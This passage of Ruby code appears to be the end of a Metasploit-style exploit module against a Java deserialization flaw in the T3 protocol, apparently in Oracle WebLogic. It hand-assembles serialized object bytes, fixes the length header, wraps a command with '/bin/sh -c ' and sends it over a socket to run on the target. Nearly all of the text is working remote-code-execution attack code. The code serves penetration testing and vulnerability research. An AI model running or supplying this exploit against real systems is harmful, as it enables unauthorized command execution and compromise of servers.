    request_obj << '787077' # TC_ENDBLOCKDATA, TC_NULL, TC_BLOCKDATA
    request_obj << '1d0181401281'
    request_obj << '34bf427600093132372e'
    request_obj << '302e312e31a53caff1'
    request_obj << '000000000078'
 
    new_len = (request_obj.length / 2).to_s(16).rjust(8, '0')
    request_obj[0, 8] = new_len
 
    sock.put([request_obj].pack('H*'))
    sleep(1)
  end
 
  def format_payload(payload_cmd)
    print_status('Formatting payload...')
    payload_arr = payload_cmd.split(' ', 3)
 
    formatted_payload = ''
    payload_arr.each do |part|
      formatted_payload << '74' # denotes a string
      formatted_payload << part.length.to_s(16).rjust(4, '0')
      formatted_payload << part.each_byte.map { |b| b.to_s(16).rjust(2, '0') }.join
    end
 
    formatted_payload
  end
 
  def execute_command(cmd, _opts = {})
    cmd.prepend('/bin/sh -c ')
    cmd = build_payload_obj(cmd)
 
    t3_send(cmd)
  end
end
